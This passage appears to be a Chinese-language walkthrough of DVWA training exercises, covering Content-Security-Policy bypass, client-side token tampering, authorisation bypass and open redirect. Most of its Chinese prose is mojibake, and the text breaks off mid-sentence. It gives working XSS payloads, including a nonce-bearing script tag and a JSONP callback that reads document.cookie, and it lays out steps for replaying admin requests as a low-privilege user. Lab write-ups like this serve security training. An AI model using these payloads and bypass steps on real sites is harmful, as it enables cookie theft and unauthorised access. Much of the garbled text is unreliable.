æ”»å‡»ã€‚è¿™é‡Œå¯ä»¥é‡‡ç”¨çŸ­ç½‘å€ã€é’“é±¼é‚®ä»¶ç­‰æ–¹æ³• Medium &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;; header($headerCSP); // Disable XSS protections so that inline alert boxes will work header (&quot;X-XSS-Protection: 0&quot;); # &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt; ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt; &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt; &lt;/form&gt; &#x27;; script-src â€˜selfâ€™: æŒ‡å®šå…è®¸æ‰§è¡Œ JavaScript ä»£ç çš„æ¥æºã€‚åœ¨è¿™é‡Œï¼Œ'self' è¡¨ç¤ºåªå…è®¸ä»åŒä¸€åŸŸååŠ è½½è„šæœ¬ã€‚ â€˜unsafe-inlineâ€™: å…è®¸å†…è”è„šæœ¬çš„æ‰§è¡Œï¼Œå³åœ¨ HTML ä¸­ç›´æ¥åµŒå…¥çš„è„šæœ¬ã€‚ â€˜nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=â€™: ä½¿ç”¨ nonceï¼ˆä¸€æ¬¡æ€§éšæœºå€¼ï¼‰æ¥æ ‡è¯†å…è®¸æ‰§è¡Œçš„è„šæœ¬ã€‚åœ¨è¿™é‡Œï¼ŒæŒ‡å®šäº†ä¸€ä¸ªç‰¹å®šçš„ nonce å€¼ã€‚åªæœ‰åŒ…å«è¿™ä¸ª nonce çš„è„šæœ¬æ‰ä¼šè¢«æ‰§è¡Œã€‚ ç”±äºè¿™ä¸€å…³å…è®¸å†…è”è„šæœ¬æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ„é€ XSSå³å¯ï¼Œä½†è¦æ³¨æ„éœ€è¦åŒ…å«ä¸Šè¿°æŒ‡å®šçš„nonceå€¼ &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(&#x27;hacker&#x27;)&lt;/script&gt; ä¹‹åç›´æ¥è¾“å…¥æ–‡æœ¬æ¡†æäº¤å³å¯ High &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;; header($headerCSP); ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt; &lt;/form&gt; &lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt; &#x27;; è¿™é‡Œåšå‡ºäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªå…è®¸åŠ è½½æ¥è‡ªè‡ªèº«ç½‘ç«™çš„jsè„šæœ¬ï¼Œä½†å¥½åœ¨é¡µé¢ä¸­æœ‰å¦‚ä¸‹æç¤º The page makes a call to ../..//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code. è¯´è¿™ä¸ªç½‘ç«™é¡µé¢ä¼šåŠ è½½vulnerabilities/csp/source/jsonp.phpä¸‹çš„phpçš„ä»£ç ï¼Œå¯¹åº”å†…å®¹å¦‚ä¸‹ &lt;?php header(&quot;Content-Type: application/json; charset=UTF-8&quot;); if (array_key_exists (&quot;callback&quot;, $_GET)) &#123; $callback = $_GET[&#x27;callback&#x27;]; &#125; else &#123; return &quot;&quot;; &#125; $outp = array (&quot;answer&quot; =&gt; &quot;15&quot;); echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;; ?&gt; åˆ¤æ–­å˜é‡callbackæ˜¯å¦å­˜åœ¨ä¸getä¼ å‚ä¸­ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œåˆ™ä¼šä¸jsè§£ç å‡ºæ¥çš„æ•°æ®ä¸€åŒæ‹¼æ¥è¾“å‡º åŒæ—¶é¡µé¢ä»£ç è¿˜å­˜åœ¨è‡ªåŠ¨åŠ è½½high.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬è¿½è¸ªçœ‹çœ‹ function clickButton() &#123; var s = document.createElement(&quot;script&quot;); s.src = &quot;source/jsonp.php?callback=solveSum&quot;; document.body.appendChild(s); &#125; function solveSum(obj) &#123; if (&quot;answer&quot; in obj) &#123; document.getElementById(&quot;answer&quot;).innerHTML = obj[&#x27;answer&#x27;]; &#125; &#125; var solve_button = document.getElementById (&quot;solve&quot;); if (solve_button) &#123; solve_button.addEventListener(&quot;click&quot;, function() &#123; clickButton(); &#125;); &#125; è¿™é‡Œè¡¨åï¼Œå½“æˆ‘ä»¬ç‚¹å‡»idä¸ºsolveçš„å…ƒç´ ä¹‹åï¼Œä¾¿ä¼šè°ƒç”¨clickButtonå‡½æ•°ï¼Œsolveä½ç½®å¦‚ä¸‹ è¯¥å‡½æ•°ä¼šåˆ›å»ºä¸€ä¸ªscriptæ ‡ç­¾ï¼š &lt;script src=&quot;http://127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum&quot;&gt;&lt;/script&gt; è¿™ä¸ªæ—¶å€™æµè§ˆå™¨å°±ä¼šå‘èµ·å¦‚ä¸‹è¯·æ±‚ï¼š http://127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum è®¿é—®è¿™ä¸ª jsonp.php ä¼šå¾—åˆ°å¦‚ä¸‹è¯·æ±‚ï¼š å¦‚æœæˆ‘ä»¬å°†callbackæ”¹ä¸ºalertä¹‹ç±»çš„ï¼Œå°±ä¼šè§¦å‘å¼¹çª—ï¼Œé‚£æ¥ä¸‹æ¥å°±æ˜¯æƒ³åŠæ³•å¦‚ä½•ä¿®æ”¹callbackå‚æ•°äº† if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; å¹¸è¿çš„æ˜¯è¿™é‡Œç•™äº†ä¸€ä¸ªincludeå‚æ•°ï¼Œå¹¶ä¸”è¯¥å‚æ•°å†…å®¹ä¼šç›´æ¥æ’å…¥bodyä¸­ï¼Œæˆ‘ä»¬ç›´æ¥åˆ©ç”¨å³å¯ï¼Œä½†è¿™é‡Œå¹¶ä¸æ˜¯ç›´æ¥æ’å…¥scriptæ ‡ç­¾ï¼Œå› ä¸ºæ²¡æœ‰unsafe_inlineï¼Œå› æ­¤å¹¶ä¸ä¼šå½“åšè„šæœ¬æ‰§è¡Œã€‚æ„é€ å¦‚ä¸‹ï¼š include=&lt;script src=source/jsonp.php?callback=alert(document.cookie)&gt;&lt;/script&gt; è¿™é‡ŒåŠ è½½jsonp.phpçš„ä»£ç ï¼Œå¹¶ä¿®æ”¹callbackå‚æ•°å³å¯æˆåŠŸå¼¹çª— Impossible &lt;?php $headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;; header($headerCSP); ?&gt; &lt;?php if (isset ($_POST[&#x27;include&#x27;])) &#123; $page[ &#x27;body&#x27; ] .= &quot; &quot; . $_POST[&#x27;include&#x27;] . &quot; &quot;; &#125; $page[ &#x27;body&#x27; ] .= &#x27; &lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt; &lt;p&gt;Unlike the high level, this does a JSONP call but does not use a callback, instead it hardcodes the function to call.&lt;/p&gt;&lt;p&gt;The CSP settings only allow external JavaScript on the local server and no inline code.&lt;/p&gt; &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt; &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt; &lt;/form&gt; &lt;script src=&quot;source/impossible.js&quot;&gt;&lt;/script&gt; &#x27;; è¿™é‡Œä¸»è¦æ˜¯ä¸‹é¢æ–‡ä»¶å‘ç”Ÿäº†æ”¹åŠ¨ï¼šjsonp_impossible.phpï¼š &lt;?php header(&quot;Content-Type: application/json; charset=UTF-8&quot;); $outp = array (&quot;answer&quot; =&gt; &quot;15&quot;); echo &quot;solveSum (&quot;.json_encode($outp).&quot;)&quot;; ?&gt; è¿™é‡ŒæŒ‡å®šäº†åªèƒ½è¾“å‡º solveSumï¼Œè¿™é‡Œä¹Ÿå°±å†™æ­»äº†ï¼Œæ²¡æ³•ç»•è¿‡ 0x14 JS Attacks Low &lt;?php $page[ &#x27;body&#x27; ] .= &lt;&lt;&lt;EOF &lt;script&gt; /* MD5 code from here https://github.com/blueimp/JavaScript-MD5 */ !function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d&#125; function rot13(inp) &#123; return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;); &#125; function generate_token() &#123; var phrase = document.getElementById(&quot;phrase&quot;).value; document.getElementById(&quot;token&quot;).value = md5(rot13(phrase)); &#125; generate_token(); &lt;/script&gt; EOF; ?&gt; å¯ä»¥åˆ°ä¸Šè¿°ä»£ç ä¸»è¦æ˜¯ç”¨æ¥ç”Ÿæˆä¸€ä¸ªtokenï¼Œå¤§æ¦‚é€»è¾‘çœ‹çœ‹æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œä¸Šè¿°ä»£ç ä¼šåœ¨å‰ç«¯htmlæ‰¾ä¸€ä¸ªidåä¸ºphraseçš„å…ƒç´ ï¼Œéšåæ‹¿åˆ°å…¶valueå€¼ï¼Œæ¥ç€æŒ‰è¯¥å€¼ç”Ÿæˆç‹¬å±äºå…¶çš„tokenã€‚å…ƒç´ ä½ç½®å¦‚ä¸‹ è€Œè¿™é‡Œå€˜è‹¥æˆ‘ä»¬ç›´æ¥å°†å…¶ä¿®æ”¹ä¸ºsuccessï¼Œä¼šå‘ç°é¡µé¢è¯´æˆ‘ä»¬æ˜¯ä¸€ä¸ªæ— æ•ˆçš„tokenï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬é‡‡ç”¨çš„æ˜¯ChangeMeçš„tokenï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•æ‹¿åˆ°successç”Ÿæˆçš„tokenï¼Œå¹¸è¿çš„æ˜¯è¿™åœ¨å‰ç«¯å°±ç”Ÿæˆäº†ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¹ä¸€ä¸‹phraseçš„å€¼ï¼Œåœ¨å‰ç«¯è¿è¡Œä¸€ä¸‹å³å¯ è¿™é‡Œåœ¨å¼€å‘è€…å·¥å…·ä¸­æ‰¾åˆ°å¯¹åº”çš„jsä»£ç åœ°å€ï¼Œåœ¨ç”Ÿæˆtokenå‡½æ•°çš„åœ°æ–¹ä¸‹ä¸€ä¸ªæ–­ç‚¹ï¼Œæ¥ç€åˆ·æ–°é¡µé¢è¿è¡Œï¼Œä¹‹åä¼šåœ¨å³ä¾§å‡ºç°phraseï¼Œæ¥ç€ä¿®æ”¹å…¶å€¼ä¸ºsuccessï¼Œä¹‹åç»§ç»­è¿è¡Œï¼Œä¼šå‘ç°ï¼Œtokenå‘ç”Ÿäº†å˜åŒ–ã€‚è¿™æ—¶æˆ‘ä»¬ç›´æ¥ä¿®æ”¹ä¸ºsuccessæäº¤ï¼Œä¼šå‘ç°æäº¤æˆåŠŸ Medium &lt;?php $page[ &#x27;body&#x27; ] .= &#x27;&lt;script src=&quot;&#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;&#x27;; ?&gt; æˆ‘ä»¬è·Ÿè¸ªmedium.jsï¼š function do_something(e)&#123; for(var t=&quot;&quot;,n=e.length-1;n&gt;=0;n--)t+=e[n]; return t &#125; setTimeout(function()&#123; do_elsesomething(&quot;XX&quot;)&#125;,300); function do_elsesomething(e)&#123; document.getElementById(&quot;token&quot;).value=do_something(e+document.getElementById(&quot;phrase&quot;).value+&quot;XX&quot;) &#125; è¿™é‡Œçœ‹äº†ä¸€ä¸‹é€»è¾‘ï¼Œå‘ç°å…¶ä¼šå–tokençš„å€¼ä¸ºxx+idåä¸ºphraseçš„å€¼+xxï¼Œæ¥ç€ä¼ ç»™do_somethingå‡½æ•°ï¼Œè¯¥å‡½æ•°å°†ä¼ å…¥çš„å‚æ•°å€’åºè¾“å‡º æˆ‘ä»¬çœ‹åˆ°ä¸Šè¿°çš„tokenå€¼ä¸ºXXeMegnahCXXï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦å°†å…¶æ”¹ä¸ºXXsseccusXXå³å¯ å¯ä»¥çœ‹åˆ°æˆåŠŸä¿®æ”¹ High &lt;?php $page[ &#x27;body&#x27; ] .= &#x27;&lt;script src=&quot;&#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;vulnerabilities/javascript/source/high.js&quot;&gt;&lt;/script&gt;&#x27;; ?&gt; var a=[&#x27;fromCharCode&#x27;,&#x27;toString&#x27;,&#x27;replace&#x27;,&#x27;BeJ&#x27;,&#x27;\\x5cw+&#x27;,&#x27;Lyg&#x27;,&#x27;SuR&#x27;,&#x27;(w()&#123;\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:&#123;&#125;;p(Y.3N).........!&#x27;&#x27;[b(&#x27;0x2&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;wpA&#x27;!==b(&#x27;0x3&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;&#125;];h=function()&#123;return b(&#x27;0x4&#x27;);&#125;;f=0x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;0x5&#x27;)===b(&#x27;0x6&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;0x2&#x27;)](new RegExp(&#x27;\\x5cb&#x27;+h(f)+&#x27;\\x5cb&#x27;,&#x27;g&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;0x7&#x27;),0x3e,0x137,b(&#x27;0x8&#x27;)[b(&#x27;0x9&#x27;)](&#x27;|&#x27;),0x0,&#123;&#125;)); è¿™é‡Œçš„ä»£ç æ˜¯è¢«æ··æ·†äº†ï¼Œæˆ‘ä»¬ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ä¸€ä¸‹ï¼šhttp://deobfuscatejavascript.com/# é‡ç‚¹ä»£ç åœ¨åé¢ï¼š function do_something(e) &#123; for (var t = &quot;&quot;, n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t &#125; function token_part_3(t, y = &quot;ZZ&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(document.getElementById(&quot;token&quot;).value + y) &#125; function token_part_2(e = &quot;YY&quot;) &#123; document.getElementById(&quot;token&quot;).value = sha256(e + document.getElementById(&quot;token&quot;).value) &#125; function token_part_1(a, b) &#123; document.getElementById(&quot;token&quot;).value = do_something(document.getElementById(&quot;phrase&quot;).value) &#125; document.getElementById(&quot;phrase&quot;).value = &quot;&quot;; setTimeout(function() &#123; token_part_2(&quot;XX&quot;) &#125;, 300); document.getElementById(&quot;send&quot;).addEventListener(&quot;click&quot;, token_part_3); token_part_1(&quot;ABCD&quot;, 44); è¿™é‡Œé¦–å…ˆå°†phraseçš„valueèµ‹å€¼ä¸ºç©ºï¼Œæ¥ç€è°ƒç”¨token_part_1å‡½æ•°ï¼Œå°†phraseçš„å€¼å€’åºè¾“å‡ºï¼Œéšåå»¶è¿Ÿ300sè°ƒç”¨token_part_2å‡½æ•°ï¼ŒYYç»è¿‡shaåŠ å¯†ï¼Œèµ‹å€¼ç»™tokençš„valueï¼Œç„¶åå½“æˆ‘ä»¬ç‚¹å‡»submitæŒ‰é’®æ—¶ï¼Œè°ƒç”¨token_part_3å‡½æ•°å°†tokenå€¼æ‹¼æ¥ZZæ¥ç€ç»è¿‡shaåŠ å¯†ï¼Œèµ‹å€¼ç»™tokençš„value è¿™é‡Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„successï¼Œä¸è¿™äº›ä»£ç æ ¹æœ¬æ— å…³ï¼Œå› ä¸ºå…¶phraseçš„å€¼å§‹ç»ˆè¢«è®¾ç½®ä¸º0ï¼Œæˆ‘ä»¬è¿›F12è°ƒè¯•çœ‹çœ‹ æˆ‘ä»¬åœ¨å³ä¾§ä¸‹ä¸ªå¯¹äºé¼ æ ‡clickçš„æ–­ç‚¹ï¼Œæ¥ç€æˆ‘ä»¬ç‚¹å‡»ä¸Šé¢çš„æ–‡æœ¬æ¡†ï¼Œä¼šå‘ç°æˆ‘ä»¬æˆåŠŸè¿›å…¥æ–­ç‚¹è°ƒè¯•ï¼Œæ¥ç€ä¸€ç›´æŒ‰è¿è¡Œé”®ï¼Œä¼šå‘ç°å·¦ä¾§å‡ºç°äº†æˆ‘ä»¬ä¹‹å‰è§£æ··æ·†çš„jsä»£ç ï¼Œæ¥ç€æˆ‘ä»¬å¯¹part1å‡½æ•°ä¸‹æ–­ç‚¹ï¼ŒåŒæ—¶å–æ¶ˆå¯¹clickçš„æ–­ç‚¹ ç„¶åå»æ§åˆ¶å°è®¾ç½®phraseçš„å€¼ä¸ºsuccessï¼ŒæŒ‰ä¸‹å›¾æ‰€ç¤ºã€‚æ¥ç€å›è½¦ä¸€ä¸‹ï¼Œéšåæ”¾è¡Œï¼Œä¼šå‘ç°åœ¨è¾“å…¥æ¡†ä¸­å‡ºç°succesï¼Œæ¥ç€æˆ‘ä»¬ç‚¹å‡»submitæŒ‰é’®å‘é€å³å¯å‘ç°æˆåŠŸä¿®æ”¹ Impossible You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level. ç›´æ¥æŠŠç”¨æˆ·è¾“å…¥çš„åœ°æ–¹å…³äº†ï¼Œè¿™æ— ä»ä¸‹æ‰‹äº†ã€‚ã€‚ã€‚ã€‚ã€‚ 0x15 Authorisation Bypass This page should only be accessible by the admin user. Your challenge is to gain access to the features using one of the other users, for example gordonb / abc123. è¿™æ„å‘³ç€è¿™æ˜¯ä¸€ä¸ªæœªæˆæƒè®¿é—®çš„æ¼æ´ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯ä»¥gordonbè¿™ä¸€ä½çº§åˆ«ç”¨æˆ·è®¿é—®ç®¡ç†å‘˜æ‰å¯ä»¥è®¿é—®çš„é¡µé¢ Low &lt;?php /* Nothing to see here for this vulnerability, have a look instead at the dvwaHtmlEcho function in: * dvwa/includes/dvwaPage.inc.php */ ?&gt; å¯è§è¿™é‡Œæ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œæ˜¯å­˜åœ¨æœªæˆæƒè®¿é—®çš„ï¼Œè®©æˆ‘ä»¬å…ˆä»¥ä½çº§åˆ«ç”¨æˆ·ç™»å½•çœ‹çœ‹ å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å½“å‰ç”¨æˆ·æ˜¯æ²¡æœ‰æƒé™è®¿é—®åˆ°åˆšæ‰çš„é¡µé¢çš„ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°è¯•æŠ“åŒ…ï¼Œçœ‹ä¸€ä¸‹åˆšåˆšç®¡ç†å‘˜é¡µé¢çš„urlåœ°å€ å¦‚ä¸Šå›¾ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬å°è¯•ç›´æ¥è®¿é—®è¯¥urlåœ°å€ å¯ä»¥çœ‹åˆ°æˆåŠŸæœªæˆæƒ Medium &lt;?php /* Only the admin user is allowed to access this page. Have a look at these two files for possible vulnerabilities: * vulnerabilities/authbypass/get_user_data.php * vulnerabilities/authbypass/change_user_details.php */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; è¿™é‡Œä»–ä¼šåˆ¤æ–­è¯¥ç”¨æˆ·æ˜¯å¦ä¸ºadminï¼Œå¦‚æœä¸æ˜¯åˆ™è¿”å›403ã€‚ ä½†å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™æ®µä»£ç ä¼¼ä¹åªæ˜¯æ£€æŸ¥medium.phpé¡µé¢ã€‚ æˆ‘ä»¬ç»§ç»­bpæŠ“ä¸€ä¸‹çœ‹çœ‹è¯¥é¡µé¢çš„åŠŸèƒ½ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°å½“æˆ‘ä»¬ç‚¹å‡»updateæŒ‰é’®çš„æ—¶å€™ï¼Œæˆ‘ä»¬å®é™…ä¸Šæ˜¯è¢«get_user_data.phpé¡µé¢è¿›è¡Œå¤„ç†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥çŒœæµ‹è¯¥é¡µé¢æ²¡æœ‰åšæœªæˆæƒå¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ç›´æ¥è®¿é—®è¯¥é¡µé¢çœ‹çœ‹ å¯ä»¥çœ‹åˆ°è™½ç„¶å…¶åªå¯¹medium.phpåšäº†é™åˆ¶ï¼Œå½“æˆ‘ä»¬è®¿é—®getuserdataçš„æ—¶å€™ï¼Œä»ç„¶å¯ä»¥å¾—åˆ°ä¸€äº›æ•°æ® High &lt;?php /* Only the admin user is allowed to access this page. Have a look at this file for possible vulnerabilities: * vulnerabilities/authbypass/change_user_details.php */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; ä¾æ—§æ˜¯ç›¸åŒçš„ä»£ç ï¼Œæˆ‘ä»¬æ¥ç€ä¸Šä¸€ä¸ªçº§åˆ«çš„æ€è·¯è®¿é—®ä¸€ä¸‹ å‘ç°è¡Œä¸é€šäº†ï¼Œè¿™ä¸ªapiæ¥å£ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ç®¡ç†å‘˜ç•Œé¢çš„æ›´æ–°æ•°æ®åœ°æ–¹ï¼Œè¿›è¡ŒbpæŠ“åŒ…ï¼Œå¦‚ä¸‹å›¾å‘ç°ï¼Œè¿™é‡Œçš„apiæ¥å£æ”¹ä¸ºäº†changeåŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ä¸Šä¸€ä¸ªçº§åˆ«æ˜¯getåŠŸèƒ½ï¼Œè¿™ä¸ç¦è®©æˆ‘ä»¬çŒœæµ‹ï¼Œè¯¥åŠŸèƒ½å¯èƒ½å¹¶æ²¡æœ‰åšå‡ºæœ‰æ•ˆçš„æœªæˆæƒè®¿é—®é™åˆ¶ è·Ÿè¸ªç›¸å…³ä»£ç ä¹Ÿå¯ä»¥å‘ç°ï¼Œè¿™é‡Œåªå¯¹impossibleçº§åˆ«åšå‡ºçš„ä¸¥æ ¼é™åˆ¶ æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨å…¶ä»–ç”¨æˆ·è®¿é—®è¯¥apié¡µé¢ï¼ŒåŒæ—¶bpæŠ“åŒ…adminç”¨æˆ·çš„changeåŠŸèƒ½å¯¹åº”çš„æ•°æ®åŒ… æ¥ä¸‹æ¥å°è¯•å°†ä¸Šé¢çš„jsonæ•°æ®èµ‹å€¼åˆ°ä¸‹é¢çš„æ™®é€šç”¨æˆ·æ•°æ®åŒ…ä¸­ï¼Œç‚¹å‡»å‘é€å¯ä»¥çœ‹åˆ°å³ä¾§å›æ˜¾è®¿é—®æˆåŠŸçš„æ ‡å¿— Impossible &lt;?php /* Only the admin user is allowed to access this page */ if (dvwaCurrentUser() != &quot;admin&quot;) &#123; print &quot;Unauthorised&quot;; http_response_code(403); exit; &#125; ?&gt; è¿™é‡Œçš„ä»£ç ä¾æ—§æ²¡æœ‰ä»€ä¹ˆå˜åŒ–ï¼Œä½†æˆ‘ä»¬è·Ÿè¸ªç›¸å…³æ–‡ä»¶å¯ä»¥å‘ç°ï¼š è¿™ä¸¤ä¸ªapiåŠŸèƒ½æ–‡ä»¶åœ¨å¯¹impossibleçº§åˆ«ä¸Šéƒ½åšå‡ºäº†ä¸¥æ ¼çš„é™åˆ¶ï¼Œåªè¦å½“å‰ç”¨æˆ·ä¸æ˜¯adminï¼Œåˆ™æ— æƒè®¿é—®ï¼Œè¿™æ˜¯æ— æ³•ç»•è¿‡çš„ è¿™é‡Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œç›´æ¥æ˜¾ç¤ºæ— æƒè®¿é—® 0x16 HTTP é‡å®šå‘ Low &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; è¿™é‡Œåˆ¤æ–­redirectå‚æ•°æ˜¯å¦é€šè¿‡getä¼ å‚ï¼Œæ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ç›´æ¥é‡å®šå‘åˆ°urlï¼Œéšåç»“æŸè„šæœ¬æ‰§è¡Œï¼Œå¦åˆ™é¡µé¢è¿”å›500å“åº”ã€‚ è¿™é‡Œå¹¶æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥é‡å®šå‘åˆ°ä»»ä½•é¡µé¢ Medium &lt;?php if (array_key_exists (&quot;redirect&quot;, $_GET) &amp;&amp; $_GET[&#x27;redirect&#x27;] != &quot;&quot;) &#123; if (preg_match (&quot;/http:\\/\\/|https:\\/\\//i&quot;, $_GET[&#x27;redirect&#x27;])) &#123; http_response_code (500); ?&gt; &lt;p&gt;Absolute URLs not allowed.&lt;/p&gt; &lt;?php exit; &#125; else &#123; header (&quot;location: &quot; . $_GET[&#x27;redirect&#x27;]); exit; &#125; &#125; http_response_code (500); ?&gt; &lt;p&gt;Missing redirect target.&lt;/p&gt; &lt;?php exit; ?&gt; è¿™é‡Œé™åˆ¶äº†redirectå‚æ•°ä»¥http://æˆ–è€…https://å¼€å¤´ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä»¥ç»å¯¹çš„urlå¼€å¤´ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç›¸å¯¹çš„url è¿™é‡Œå€Ÿç”¨é˜®ä¸€å³°è€å¸ˆå¯¹ç›¸å¯¹urlä¸ç»å¯¹urlçš„è§£é‡Šï¼š URL åˆ†æˆä¸¤ç§ï¼šç»å¯¹ URL å’Œç›¸å¯¹ URLã€‚ ç»å¯¹ URL æŒ‡çš„æ˜¯ï¼Œåªé  URL æœ¬èº«å°±èƒ½ç¡®å®šèµ„æºçš„ä½ç½®ã€‚è¿™æ„å‘³ç€ï¼ŒURL å¿…é¡»å¸¦æœ‰èµ„æºçš„å®Œæ•´ä¿¡æ¯ï¼ŒåŒ…å«åè®®ã€ä¸»æœºã€è·¯å¾„ç­‰éƒ¨åˆ†ã€‚å‰é¢çš„ä¾‹å­éƒ½æ˜¯ç»å¯¹ URLã€‚ ç›¸å¯¹ URL æŒ‡çš„æ˜¯ï¼ŒURL 